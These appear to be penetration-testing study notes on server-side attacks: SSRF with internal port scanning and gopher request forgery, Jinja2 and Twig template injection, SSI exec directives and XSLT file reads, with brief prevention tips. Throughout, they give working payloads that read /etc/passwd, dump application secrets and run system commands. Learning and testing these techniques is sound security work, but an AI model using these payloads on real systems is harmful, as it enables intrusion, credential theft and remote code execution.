## Introduction to Server-Side Attacks 
Attacks application provided by a server. 
Server side attacks include: 
- Server-Side Request Forgery (SSRF)
- Server-Side Template Injection (SSTI)
- Server-Side Includes Injection (SSI)
- eXtennsible Stylesheet Language Transformations (XSLT) Server-Side Injection

### SSRF
[Server-Side Request Forgery (SSRF)](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery) is a vulnerability where an attacker manipulates web application into sending unauthorized requests from server. Occurs when user input controls applications HTTP requests to other servers. Allows ***bypass of firewalls***, ***accessing internal systems*** and ***retrieving sensitive information***. 

### SSTI
Web applications that use templating engines and server-side templates that generate responses to html content dynamically. This generation is based on user input enabling website to respond dynamically. [Server-Side Template Injection](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection)

### SSI Injection
SSI directives instruct web server to include additional content dynamically. SSI can be used to include content that's present in all HTML Pages. When attacker can inject commands into SSI directives [Server-Side Includes (SSI) Injection](https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection) can occur. 

### XSLT Server-Side Injection
XSLT Injection occurs when attacker can manipulate XSLT transformations preformed on webserver. Used to transform XML to HTML and commonly employed in applications to generate content dynamically. exploitation of weaknesses in XSLT Leads to ACE

## Introduction to SSRF 
SSRF part of OWASP top 10. occurs when site fetches resources from remote location based on user supplied data. 

If web app relies on URL scheme attacker might be able to cause undesired behaviour by manipulating url scheme
- HTTP:// is usable to bypass WAFs or access restricted or internal endpoints
- FILE:// Reads file from local system, an attacker might use this to read local files on web server
- gopher:// can send arbitrary bytes to specified address 

## Identifying SSRF
Burp Request will have a URL request in the parameter (or obfuscated) indicates a web server is being contacted to fetch information from separate system.

To confirm SSRF vulnerability we can point the URL to our machine or local servers with nc listener.
If response contains data then we know it is not a blind SSRF
### Enumerating the system
Using this SSRF we can then begin to enumerate the local system, we can use 127.0.0.1:X and conduct an internal port scan of the system. 

We can fuzz internal ports with a custom wordlist and ffuf and the -fr (filter response) flag
```bash
seq 1 10000 > ports.txt
```

```shell-session
ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
```

 ***Important add -H 'Content-Type: application/x-www-form-urlencoded'***

***Must match original protocol***

## Exploiting SSRF

### Accessing Restricted Endpoints 
Like enumerating ports we can enumerate directories with fuzzing.
- Determine response on Burp when we use an invalid directory
- filter response in FFUF to remove domains

May need to add file extension depending on web technology used

### Local File Inclusion (LFI)
We can use the `file://` url scheme to exploit possible local file inclusion ie: `file://etc/passwd`
possible to then exploit lfi vulnerabilities

### Gopher Protocol
Found admin endpoint needs to use post however no way to send this with http:// protocol so we can use gopher:// to send arbitrary bytes to tcp socket

***Example Post Request***
```http
POST /admin.php HTTP/1.1
Host: dateserver.htb
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

adminpw=admin
```

We need to URL-encode all special characters to construct a valid gopher URL from this. In particular, spaces (`%20`) and newlines (`%0D%0A`)

```
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```

since we sent bytes to spoof HTTP request server responds accordingly

gopher can be used to interact with most services and we can use this to escalate if we find an open internal port

Obviously really hard to do on your own
***USE THIS:***  [Gopherus](https://github.com/tarunkant/Gopherus)

Because we're sending a gopher inside the data field we need to url-encode it twice

## Blind SSRF
Not all SSRF requests will return a value, therefore impact of blind SSRF is generally lower.

### Identifying Blind SSRF
we can confirm blind SSRF by providing link for a system we own with a listener.

Usually a lot more limited compared to SSRF we can still do a port scan of the system depending on errors

Also we can detect files present on the local system with this technique if there is a change in errors.

***TO PREVENT: WHITELIST AND FIREWALL RULES***
[OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).

## Template Engines
Software that combines pre-generated templates with dynamically generated data. used to generate dynamic responses.

Everyday use case is website that keeps headers and footers the same, template dynamically adds content but keeps header and footer the same.

Reduce Complexity > Enables maintainability
[Jinja](https://jinja.palletsprojects.com/en/3.1.x/) and [Twig](https://twig.symfony.com/)

### Templating
Templating engines require 2 inputs, content and template.
Typically Key:Value pairs 
Template syntax depends on engine used

```jinja2
Hello {{ name }}!
```
Contains variable name which is then replaced by dynamic value provided to render function.
Dynamic value often provided by user, not ran on server side and typically same. 
Only works when user can manipulate template parameter, as template engines run the code provided in template.

SSTI can occur when user input is inserted into the template **before** the rendering function is called on the template. A different instance would be if a web application calls the rendering function on the same template multiple times.

if user input is placed into the template before the rendering function is called, it will be considered part of the template string in the second rendering process. 

## Identifying SSTI
The most effective way is to inject special characters with semantic meaning in template engines and observe the web application's behavior

***Popular test string consisting of all special characters that have meaning in engines***
```
${{<%[%'"}}%\.
```

#### Identity tests
If previous string provided an error we can then move onto identification of template engine.
![[template_engine_detection.png]]

## Exploiting Jinja2
Jinja2 is use in common python web frameworks like flask and django
Possible to then use python exploits, possibly with imports

### Information Disclosure
We can manipulate Template injection to view key config parameters and even the source code.
***Config Files***
```jinja2
{{ config.items() }}
```
Dumps entire web application config, including secret keys. 
***Dump Built in Functions***
```jinja2
{{ self.__init__.__globals__.__builtins__ }}
```

since python functions have open we can check for local file inclusion.
### Local File Inclusion
***Reading system files 
```jinja2
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```

### RCE
We can use this to import the os module and use the open popen command.
***Run System Commands***
```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```


## Exploiting Twig
Twig is a template engine for the PHP language.
### Information Disclosure
***Include Information about current template***
```twig
{{ _self }}
```

### Local File Inclusion
Not possible to view local files with SSTI and Twig, however if symphony is used we can use this code for LFI
***Symphony file_excerpt Function***
```twig
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```

### RCE
With PHP we can use the system command
***PHP System Command Injection***
```twig
{{ ['id'] | filter('system') }}
```

[PayloadsAllTheThings SSTI CheatSheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)

## Tools of Trade and Prevention
[SSTImap](https://github.com/vladko312/SSTImap)

To prevent SSTI vulnerabilities, we must ensure that user input is never fed into the call to the template engine's rendering function in the template parameter. This can be achieved by carefully going through the different code paths and ensuring that user input is never added to a template before a call to the rendering function.

Suppose a web application intends to have users modify existing templates or upload new ones for business reasons. In that case, it is crucial to implement proper hardening measures to prevent the takeover of the web server. This process can include hardening the template engine by removing potentially dangerous functions that can be used to achieve remote code execution from the execution environment. Removing dangerous functions prevents attackers from using these functions in their payloads. However, this technique is prone to bypasses. A better approach would be to separate the execution environment in which the template engine runs entirely from the web server, for instance, by setting up a separate execution environment such as a Docker container.

## SSI Injection
***Server Side Includes*** is a web app technology used to create dynamic web pages on html pages. Supported by Apache

Look for file extensions `.shtml .shtm .stm`
Servers can be configured to use SSI directives in arbitrary files, 

SI injection occurs when an attacker can inject SSI directives into a file that is subsequently served by the web server, resulting in the execution of the injected SSI directives.

### SSI Directive
SSI Directives contain 3 main components. 
- `name`: the directive's name
- `parameter name`: one or more parameters
- `value`: one or more parameter values
***with the following syntax***
```ssi
<!--#name param1="value1" param2="value" -->
```
#### printenv
***This directive prints environment variables. It does not take any variables***
```ssi
<!--#printenv -->
```
#### config
***This directive changes the SSI configuration by specifying corresponding parameters***
```ssi
<!--#config errmsg="Error!" -->
```
#### exec
***This directive executes the command given in the `cmd` parameter:***
```ssi
<!--#exec cmd="whoami" -->
```

We can guess that the page supports SSI based on the file extension.

### Prevention
Sanitize input!!!!

## XSLT Injection
[eXtensible Stylesheet Language Transformation (XSLT)](https://www.w3.org/TR/xslt-30/) is a language enabling XML documents. Can select specific XML nodes and change XML structure. 

### eXtensible Stylesheet Language Transformation (XSLT)
XSLT can be used to define a data format which is subsequently enriched with data from the XML document. XSLT data is structured similarly to XML. However, it contains XSL elements within nodes prefixed with the `xsl`-prefix. The following are some commonly used XSL elements:

- `<xsl:template>`: This element indicates an XSL template. It can contain a `match` attribute that contains a path in the XML document that the template applies to
- `<xsl:value-of>`: This element extracts the value of the XML node specified in the `select` attribute
- `<xsl:for-each>`: This element enables looping over all XML nodes specified in the `select` attribute

Injection can occur when user input is put into XSL data before output generation

###  Local File Inclusion (LFI)
We can try to use multiple different functions to read a local file. Whether a payload will work depends on the XSLT version and the configuration of the XSLT library. For instance, XSLT contains a function `unparsed-text` that can be used to read a local file:
```xml
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
```
However, it was only introduced in XSLT version 2.0. Thus, our sample web application does not support this function and instead errors out. However, if the XSLT library is configured to support PHP functions, we can call the PHP function `file_get_contents` using the following XSLT element:
```xml
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```

## Prevention
SANITIZE!!


